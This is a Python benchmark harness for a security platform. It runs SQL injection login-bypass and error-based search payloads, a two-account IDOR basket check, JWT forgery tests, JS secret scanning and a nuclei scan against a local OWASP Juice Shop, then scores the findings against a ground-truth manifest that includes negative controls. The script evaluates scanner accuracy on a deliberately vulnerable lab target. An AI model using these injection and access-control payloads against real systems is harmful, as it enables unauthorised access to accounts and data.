"""
AIOSOP Capability Benchmark — OWASP Juice Shop (local, :3000)
============================================================

PURPOSE
    Produce the platform's first *reproducible, evidence-backed* proof of
    vulnerability-discovery capability, decoupled from the fragile
    orchestrator/Neo4j/LLM stack. It drives AIOSOP's REAL deterministic
    engines (DiffAuthEngine, JWTTester, js_analyzer secret rules) plus
    deterministic HTTP oracles against a known, legal, intentionally-
    vulnerable target with a GROUND-TRUTH manifest so we can measure:

        discovered / validated / false-positive / false-negative /
        time-to-discovery / autonomous stability / evidence quality

DESIGN PRINCIPLES (map to the transformation mandate)
    * Deterministic oracles     — a finding is VALIDATED only by an objective
                                  signal (auth bypass, DB error, ownership proof),
                                  never by an LLM opinion.
    * Hang-proof                — every check runs under a hard asyncio timeout;
                                  a wedged check becomes a TIMEOUT datapoint, the
                                  suite never hangs.
    * Ground truth              — a manifest with expected=True/False lets us
                                  score recall AND precision (negative controls).
    * Real code                 — imports the actual platform engines, not
                                  reimplementations, so the benchmark proves the
                                  PLATFORM, not the harness.

USAGE
    python benchmarks/juiceshop/bench.py --target http://localhost:3000 --repeat 3

Only run against targets you are authorised to test. Default is the local
Juice Shop container, which is designed for exactly this.
"""
from __future__ import annotations

import argparse
import asyncio
import json
import sys
import time
import traceback
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Optional

import httpx

# --- import the REAL platform engines (must be importable standalone) ---------
REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "src"))

from ai_osop.core.jwt_tester import JWTTester  # noqa: E402
from ai_osop.core.diff_auth_engine import DifferentialAuthEngine  # noqa: E402
from ai_osop.core.models import Resource  # noqa: E402
import ai_osop.agents.js_analyzer_agent as jsa  # noqa: E402


# =============================================================================
# Ground-truth manifest of canonical Juice Shop weaknesses.
#   expected=True   -> a capable scanner SHOULD validate it (miss => false neg)
#   expected=False  -> a NEGATIVE CONTROL; validating it => FALSE POSITIVE
# =============================================================================
@dataclass
class ManifestEntry:
    check_id: str
    name: str
    owasp: str
    cwe: str
    expected: bool  # is this genuinely exploitable on stock Juice Shop?
    scored: bool = True  # informational scanners are not scored TP/FP


MANIFEST = [
    ManifestEntry("sqli_login_bypass", "SQLi auth bypass on /rest/user/login",
                  "A03 Injection", "CWE-89", True),
    ManifestEntry("sqli_search_error", "Error-based SQLi on /rest/products/search",
                  "A03 Injection", "CWE-89", True),
    ManifestEntry("idor_basket", "Broken access control: read another user's basket",
                  "A01 Broken Access Control", "CWE-639", True),
    ManifestEntry("idor_public_negative", "NEGATIVE CONTROL: public homepage must NOT be flagged IDOR",
                  "A01 (control)", "N/A", False),
    ManifestEntry("sqli_search_negative", "NEGATIVE CONTROL: benign search must NOT be flagged SQLi",
                  "A03 (control)", "N/A", False),
    ManifestEntry("jwt_forgery", "JWT forgery / weak verification via real JWTTester",
                  "A02 Cryptographic Failures", "CWE-347", True),
    ManifestEntry("secrets_in_js", "Hardcoded secrets in JS bundle via js_analyzer rules",
                  "A05 Security Misconfiguration", "CWE-798", False,
                  scored=False),  # honest: stock Juice Shop bundles vary; informational
    ManifestEntry("nuclei_scan", "nuclei scoped scan (informational breadth)",
                  "multi", "multi", False, scored=False),
]


# =============================================================================
# Result model
# =============================================================================
@dataclass
class CheckResult:
    check_id: str
    validated: bool                 # oracle fired -> we assert the vuln exists
    status: str                     # VALIDATED | NOT_FOUND | TIMEOUT | ERROR
    confidence: float = 0.0
    seconds: float = 0.0
    evidence: dict = field(default_factory=dict)
    error: Optional[str] = None


# =============================================================================
# Juice Shop helpers
# =============================================================================
class Target:
    def __init__(self, base: str, client: httpx.AsyncClient):
        self.base = base.rstrip("/")
        self.c = client

    async def login(self, email: str, password: str) -> Optional[str]:
        r = await self.c.post(f"{self.base}/rest/user/login",
                              json={"email": email, "password": password})
        if r.status_code == 200:
            try:
                return r.json()["authentication"]["token"]
            except Exception:
                return None
        return None

    async def register(self, email: str, password: str) -> bool:
        # Juice Shop /api/Users is permissive; passwordRepeat/security optional in many builds.
        body = {"email": email, "password": password, "passwordRepeat": password,
                "securityQuestion": {"id": 1}, "securityAnswer": "bench"}
        r = await self.c.post(f"{self.base}/api/Users", json=body)
        return r.status_code in (200, 201)

    async def whoami(self, token: str) -> dict:
        r = await self.c.get(f"{self.base}/rest/user/whoami",
                             headers={"Authorization": f"Bearer {token}"})
        try:
            return r.json().get("user", {})
        except Exception:
            return {}

    async def basket(self, bid: Any, token: Optional[str]) -> httpx.Response:
        h = {"Authorization": f"Bearer {token}"} if token else {}
        return await self.c.get(f"{self.base}/rest/basket/{bid}", headers=h)


def _bid_from_token(token: str) -> Optional[Any]:
    """Juice Shop embeds the basket id (`bid`) and user record in the JWT payload."""
    import base64
    try:
        p = token.split(".")[1]
        p += "=" * (-len(p) % 4)
        payload = json.loads(base64.urlsafe_b64decode(p))
        return payload.get("bid") or payload.get("data", {}).get("id")
    except Exception:
        return None


def _resp_evidence(r: httpx.Response) -> dict:
    body: Any
    try:
        body = r.json()
    except Exception:
        body = r.text[:400]
    return {"status_code": r.status_code, "body": body}


# =============================================================================
# Oracle checks — each is deterministic and returns a CheckResult
# =============================================================================
async def check_sqli_login_bypass(t: Target) -> CheckResult:
    for payload in ("' OR 1=1--", "' OR true--", "admin@juice-sh.op'--"):
        r = await t.c.post(f"{t.base}/rest/user/login",
                           json={"email": payload, "password": "benchmark-not-a-real-pw"})
        token = None
        if r.status_code == 200:
            try:
                token = r.json()["authentication"]["token"]
            except Exception:
                token = None
        if token:
            return CheckResult(
                "sqli_login_bypass", True, "VALIDATED", confidence=1.0,
                evidence={"payload": payload, "http_status": 200,
                          "proof": "server issued a session JWT for an injected email with a bogus password",
                          "token_prefix": token[:24] + "..."})
    return CheckResult("sqli_login_bypass", False, "NOT_FOUND",
                       evidence={"note": "no injection payload yielded a session token"})


async def check_sqli_search_error(t: Target) -> CheckResult:
    # Juice Shop's product search interpolates q into a raw SQL string wrapped in
    # parentheses; a single quote returns empty, but breaking the parens raises a
    # SQLite parse error (error-based SQLi oracle).
    sql_markers = ("sqlite_error", "sqlite", "syntax error", "sequelizedatabaseerror",
                   "unrecognized token", "near \"")
    for payload in ("qwert'))--", "'))--", "') OR 1=1--", "'"):
        r = await t.c.get(f"{t.base}/rest/products/search", params={"q": payload})
        body = r.text[:800]
        if r.status_code >= 500 and any(m in body.lower() for m in sql_markers):
            return CheckResult("sqli_search_error", True, "VALIDATED", confidence=1.0,
                               evidence={"payload": payload, "http_status": r.status_code,
                                         "db_error_excerpt": body[:220]})
    return CheckResult("sqli_search_error", False, "NOT_FOUND",
                       evidence={"note": "no payload produced a DB parse error "
                                         "(search may be parameterized in this build)",
                                 "last_status": r.status_code})


async def check_sqli_search_negative(t: Target) -> CheckResult:
    """NEGATIVE CONTROL: a benign query must NOT trip the SQLi oracle."""
    r = await t.c.get(f"{t.base}/rest/products/search", params={"q": "apple"})
    body = r.text[:600]
    fired = r.status_code >= 500 and "sqlite" in body.lower()
    # 'validated' here means the oracle *incorrectly* fired -> false positive
    return CheckResult("sqli_search_negative", fired,
                       "VALIDATED" if fired else "NOT_FOUND",
                       evidence={"http_status": r.status_code,
                                 "note": "benign query; any VALIDATED here is a false positive"})


async def _diff_auth_idor(t: Target) -> tuple[Optional[Any], dict]:
    """Set up two identities and run the REAL DiffAuthEngine on a cross-account basket."""
    engine = DifferentialAuthEngine(session_memory=None)
    import os

    # Two independent, freshly-registered identities (clean, deterministic).
    victim = f"bench_v_{os.urandom(4).hex()}@bench.local"
    attacker = f"bench_a_{os.urandom(4).hex()}@bench.local"
    await t.register(victim, "BenchPass123!")
    await t.register(attacker, "BenchPass123!")
    tok_v = await t.login(victim, "BenchPass123!")
    tok_a = await t.login(attacker, "BenchPass123!")
    if not (tok_v and tok_a):
        return None, {"error": "could not establish two identities",
                      "tok_v": bool(tok_v), "tok_a": bool(tok_a)}

    bid_v = _bid_from_token(tok_v)   # victim's basket id, straight from the JWT
    if not bid_v:
        return None, {"error": "victim basket id not in token"}

    owner_resp = await t.basket(bid_v, tok_v)      # victim reads own basket (legit)
    attacker_resp = await t.basket(bid_v, tok_a)   # attacker reads victim's basket (attack)
    anon_resp = await t.basket(bid_v, None)        # anonymous baseline
    bid_b = bid_v

    ev_owner = _resp_evidence(owner_resp)
    ev_attacker = _resp_evidence(attacker_resp)
    ev_attacker["user_label"] = "attacker_admin"
    ev_anon = _resp_evidence(anon_resp)

    resource = Resource(id=f"basket:{bid_b}", type="basket", value=str(bid_b),
                        owner_identity_id=victim, metadata={}, engagement_id="bench")

    finding = await engine.compare(
        identity_a_evidence=ev_owner,
        identity_b_evidence=ev_attacker,
        resource=resource,
        expected_allowed=False,
        anonymous_evidence=ev_anon,
    )
    detail = {"victim_basket_id": bid_b,
              "attacker_http_status": ev_attacker["status_code"],
              "owner_http_status": ev_owner["status_code"],
              "anon_http_status": ev_anon["status_code"]}
    return finding, detail


async def check_idor_basket(t: Target) -> CheckResult:
    finding, detail = await _diff_auth_idor(t)
    if finding is not None and getattr(finding, "confidence", 0) >= 0.5:
        return CheckResult("idor_basket", True, "VALIDATED",
                           confidence=float(finding.confidence),
                           evidence={"category": finding.category,
                                     "diff": finding.evidence_diff, **detail})
    return CheckResult("idor_basket", False, "NOT_FOUND",
                       evidence={"note": "DiffAuthEngine did not confirm cross-account access "
                                         "(target may enforce access control here)", **detail})


async def check_idor_public_negative(t: Target) -> CheckResult:
    """NEGATIVE CONTROL: feed the engine a PUBLIC resource (homepage) as if probing
    IDOR. A correct engine must return None (anon-baseline FP suppression)."""
    engine = DifferentialAuthEngine(session_memory=None)
    tok_a = await t.login("' OR 1=1--", "x")
    r_auth = await t.c.get(f"{t.base}/", headers={"Authorization": f"Bearer {tok_a}"})
    r_anon = await t.c.get(f"{t.base}/")
    ev_auth = _resp_evidence(r_auth); ev_auth["user_label"] = "attacker_admin"
    ev_anon = _resp_evidence(r_anon)
    resource = Resource(id="page:home", type="page", value="/", owner_identity_id="public",
                        metadata={}, engagement_id="bench")
    finding = await engine.compare(identity_a_evidence=ev_anon, identity_b_evidence=ev_auth,
                                   resource=resource, expected_allowed=False,
                                   anonymous_evidence=ev_anon)
    fired = finding is not None
    return CheckResult("idor_public_negative", fired,
                       "VALIDATED" if fired else "NOT_FOUND",
                       confidence=float(getattr(finding, "confidence", 0.0)) if fired else 0.0,
                       evidence={"note": "public resource; any VALIDATED here is a false positive "
                                         "(FP-suppression failure)",
                                 "engine_returned_finding": fired})


async def check_jwt_forgery(t: Target) -> CheckResult:
    tok = await t.login("' OR 1=1--", "x")
    if not tok:
        return CheckResult("jwt_forgery", False, "NOT_FOUND",
                           evidence={"error": "no base token to test"})
    tester = JWTTester(verify_url=f"{t.base}/rest/user/whoami", base_token=tok,
                       method="GET", timeout=15.0)
    findings = await tester.run()
    confirmed = [f for f in findings if getattr(f, "confirmed", False)]
    if confirmed:
        f0 = confirmed[0]
        return CheckResult("jwt_forgery", True, "VALIDATED", confidence=0.95,
                           evidence={"confirmed_count": len(confirmed),
                                     "technique": f0.technique, "detail": f0.detail[:160]})
    return CheckResult("jwt_forgery", False, "NOT_FOUND",
                       evidence={"note": "JWTTester found no CONFIRMED forgery",
                                 "techniques_tried": [f.technique for f in findings][:6]})


async def check_secrets_in_js(t: Target) -> CheckResult:
    # discover the main bundle from index.html
    idx = (await t.c.get(f"{t.base}/")).text
    import re
    bundles = re.findall(r'(?:src=")([^"]*main[^"]*\.js)', idx) or \
              re.findall(r'(?:src=")([^"]*\.js)', idx)
    hits = []
    for b in bundles[:4]:
        url = b if b.startswith("http") else f"{t.base}/{b.lstrip('/')}"
        try:
            js = (await t.c.get(url)).text
        except Exception:
            continue
        for entry in getattr(jsa, "SECRET_RULES", []):
            # SECRET_RULES entries are (name, compiled_regex, severity, weight)
            name, rule = entry[0], entry[1]
            for m in rule.finditer(js):
                val = m.group(m.lastindex or 0)
                if jsa._looks_like_placeholder(val):
                    continue
                if jsa._shannon_entropy(val) < 3.0:
                    continue
                hits.append({"rule": name, "value_prefix": val[:8] + "..."})
    validated = len(hits) > 0
    return CheckResult("secrets_in_js", validated,
                       "VALIDATED" if validated else "NOT_FOUND",
                       evidence={"bundles_scanned": len(bundles[:4]),
                                 "secret_hits": hits[:10],
                                 "note": "informational: real secret detection rules applied "
                                         "with placeholder+entropy filtering"})


async def check_nuclei_scan(t: Target) -> CheckResult:
    """Run the same scanner the platform uses, scoped for speed."""
    import shutil
    if not shutil.which("nuclei"):
        return CheckResult("nuclei_scan", False, "ERROR",
                           error="nuclei not on PATH", evidence={})
    proc = await asyncio.create_subprocess_exec(
        "nuclei", "-u", t.base, "-jsonl", "-silent",
        "-tags", "exposure,misconfig,tech,cve", "-severity", "medium,high,critical",
        "-timeout", "5", "-retries", "0",
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    out, _ = await proc.communicate()
    findings = []
    for line in out.decode(errors="ignore").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            j = json.loads(line)
            findings.append({"template": j.get("template-id"),
                             "severity": j.get("info", {}).get("severity"),
                             "matched": j.get("matched-at")})
        except Exception:
            pass
    return CheckResult("nuclei_scan", len(findings) > 0,
                       "VALIDATED" if findings else "NOT_FOUND",
                       evidence={"finding_count": len(findings), "findings": findings[:20],
                                 "note": "informational breadth; nuclei findings are not "
                                         "auto-counted as validated bounty-grade bugs"})


CHECKS: dict[str, Callable[[Target], Any]] = {
    "sqli_login_bypass": check_sqli_login_bypass,
    "sqli_search_error": check_sqli_search_error,
    "sqli_search_negative": check_sqli_search_negative,
    "idor_basket": check_idor_basket,
    "idor_public_negative": check_idor_public_negative,
    "jwt_forgery": check_jwt_forgery,
    "secrets_in_js": check_secrets_in_js,
    "nuclei_scan": check_nuclei_scan,
}


# =============================================================================
# Hang-proof runner
# =============================================================================
async def run_check(name: str, fn, t: Target, timeout: float) -> CheckResult:
    t0 = time.time()
    try:
        res: CheckResult = await asyncio.wait_for(fn(t), timeout=timeout)
    except asyncio.TimeoutError:
        return CheckResult(name, False, "TIMEOUT", seconds=round(time.time() - t0, 2),
                           error=f"exceeded {timeout}s hard timeout")
    except Exception as e:
        return CheckResult(name, False, "ERROR", seconds=round(time.time() - t0, 2),
                           error=f"{type(e).__name__}: {e}",
                           evidence={"trace": traceback.format_exc().splitlines()[-3:]})
    res.seconds = round(time.time() - t0, 2)
    return res


async def run_suite(target: str, timeout: float) -> list[CheckResult]:
    async with httpx.AsyncClient(timeout=timeout, verify=False,
                                 follow_redirects=True) as client:
        t = Target(target, client)
        results = []
        for name, fn in CHECKS.items():
            r = await run_check(name, fn, t, timeout)
            flag = {"VALIDATED": "[OK]", "NOT_FOUND": "[--]", "TIMEOUT": "[TO]", "ERROR": "[XX]"}.get(r.status, "[??]")
            print(f"  {flag} {name:<24} {r.status:<10} {r.seconds:>5}s "
                  f"conf={r.confidence:.2f}" + (f"  err={r.error}" if r.error else ""))
            results.append(r)
        return results


# =============================================================================
# Scoring
# =============================================================================
def score(all_runs: list[list[CheckResult]]) -> dict:
    manifest = {m.check_id: m for m in MANIFEST}
    # stability: a run is "clean" if no check ended TIMEOUT/ERROR unexpectedly
    stability_clean = 0
    for run in all_runs:
        if all(r.status not in ("TIMEOUT",) for r in run):
            stability_clean += 1

    # use the LAST run for per-check verdicts; aggregate timing across runs
    last = {r.check_id: r for r in all_runs[-1]}
    tp = fp = fn = tn = 0
    per_check = {}
    for cid, m in manifest.items():
        r = last.get(cid)
        if r is None:
            continue
        validated = r.validated
        verdict = "n/a"
        if m.scored:
            if m.expected and validated:
                tp += 1; verdict = "TRUE_POSITIVE"
            elif m.expected and not validated:
                fn += 1; verdict = "FALSE_NEGATIVE"
            elif (not m.expected) and validated:
                fp += 1; verdict = "FALSE_POSITIVE"
            else:
                tn += 1; verdict = "TRUE_NEGATIVE"
        times = [rr.__dict__[cid_i] for rr in [] for cid_i in []]  # placeholder
        per_check[cid] = {
            "name": m.name, "owasp": m.owasp, "cwe": m.cwe,
            "expected_exploitable": m.expected, "scored": m.scored,
            "validated": validated, "status": r.status,
            "confidence": r.confidence, "verdict": verdict,
            "avg_seconds": round(sum(x.seconds for run in all_runs
                                     for x in run if x.check_id == cid) / len(all_runs), 2),
            "evidence": r.evidence, "error": r.error,
        }
    precision = tp / (tp + fp) if (tp + fp) else None
    recall = tp / (tp + fn) if (tp + fn) else None
    return {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "runs": len(all_runs),
        "stability": {"clean_runs_no_timeout": stability_clean, "total_runs": len(all_runs),
                      "stable": stability_clean == len(all_runs)},
        "scored_scoreboard": {"true_positive": tp, "false_negative": fn,
                              "false_positive": fp, "true_negative": tn,
                              "precision": precision, "recall": recall},
        "per_check": per_check,
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://localhost:3000")
    ap.add_argument("--timeout", type=float, default=45.0, help="hard per-check timeout (s)")
    ap.add_argument("--repeat", type=int, default=1, help="repeat suite N times for stability")
    args = ap.parse_args()

    print(f"\nAIOSOP capability benchmark  target={args.target}  "
          f"per-check-timeout={args.timeout}s  repeat={args.repeat}\n")
    all_runs = []
    for i in range(args.repeat):
        print(f"--- run {i + 1}/{args.repeat} ---")
        all_runs.append(asyncio.run(run_suite(args.target, args.timeout)))

    report = score(all_runs)
    sb = report["scored_scoreboard"]
    print("\n================ SCOREBOARD (scored checks only) ================")
    print(f"  TruePos={sb['true_positive']}  FalseNeg={sb['false_negative']}  "
          f"FalsePos={sb['false_positive']}  TrueNeg={sb['true_negative']}")
    print(f"  precision={sb['precision']}  recall={sb['recall']}")
    print(f"  stability: {report['stability']['clean_runs_no_timeout']}/"
          f"{report['stability']['total_runs']} runs with no hang")

    outdir = Path(__file__).parent / "results"
    outdir.mkdir(exist_ok=True)
    stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    outfile = outdir / f"bench-{stamp}.json"
    outfile.write_text(json.dumps(report, indent=2, default=str))
    print(f"\n  evidence written: {outfile.relative_to(REPO)}\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
